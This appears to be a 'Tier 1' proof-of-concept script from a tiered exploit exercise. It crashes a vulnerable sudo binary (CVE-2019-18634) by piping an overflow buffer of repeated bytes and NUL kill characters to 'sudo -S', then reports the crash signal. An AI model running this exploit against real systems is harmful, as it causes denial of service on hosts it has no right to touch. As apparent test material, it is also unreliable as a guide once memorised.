#!/usr/bin/env python3
"""
Tier 1 (Basic): crash the vulnerable sudo.

This is the public reproduction of CVE-2019-18634: feed sudo a long string
containing the terminal kill character (0x00 when reading from a pipe) so
that getln() overwrites past its buffer and segfaults.

Running this prints "CRASH_SIGNAL=<n>" (11 == SIGSEGV) and exits 0 when the
crash was observed.
"""

import subprocess
import sys

SUDO = "/opt/vuln/bin/sudo"


def main():
    sudo = sys.argv[1] if len(sys.argv) > 1 else SUDO
    payload = (b"A" * 100 + b"\x00") * 50

    proc = subprocess.Popen(
        [sudo, "-S", "-k", "id"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out, _ = proc.communicate(payload)
    rc = proc.returncode
    signal = -rc if rc is not None and rc < 0 else 0

    sys.stdout.buffer.write(out)
    print("CRASH_SIGNAL=%d" % signal)
    return 0 if signal != 0 else 1


if __name__ == "__main__":
    sys.exit(main())
